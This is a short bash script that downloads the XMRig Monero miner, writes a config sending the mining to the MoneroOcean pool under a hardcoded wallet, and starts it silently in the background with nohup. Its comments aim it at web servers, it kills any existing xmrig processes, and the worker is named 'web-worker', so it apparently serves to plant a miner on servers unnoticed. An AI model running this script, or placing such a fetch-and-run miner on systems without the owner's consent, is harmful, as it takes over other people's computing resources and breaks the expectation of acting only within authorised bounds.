#!/bin/bash
WALLET=458dxk6pcKg3KR6YGVByY1FKKr88GPnz3XxQL7c7zx5UNoxAsKzMN4JJ8zbffq4LRv8dk5CXYBVAEdYBe2avS9qt7jjjKpa
DIR=$HOME/moneroocean

# 1. Kill everything
killall -9 xmrig 2>/dev/null
rm -rf $DIR
mkdir -p $DIR

# 2. Download OFFICIAL XMRig (No benchmarks, just mining)
# This version is much more stable for web servers
curl -L "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz" -o /tmp/xmrig.tar.gz
tar xf /tmp/xmrig.tar.gz -C $DIR --strip-components=1
rm /tmp/xmrig.tar.gz

# 3. Create the Simple Config
cat >$DIR/config.json <<EOL
{
    "autosave": false,
    "donate-level": 1,
    "cpu": {
        "enabled": true,
        "max-threads-hint": 35
    },
    "pools": [
        {
            "url": "gulf.moneroocean.stream:10128",
            "user": "$WALLET",
            "pass": "web-worker",
            "keepalive": true,
            "tls": false
        }
    ],
    "log-file": "$DIR/xmrig.log"
}
EOL

# 4. Launch
cd $DIR
nohup ./xmrig -c config.json > /dev/null 2>&1 &

echo "SUCCESS: Stock Miner started. Calibration skipped entirely."
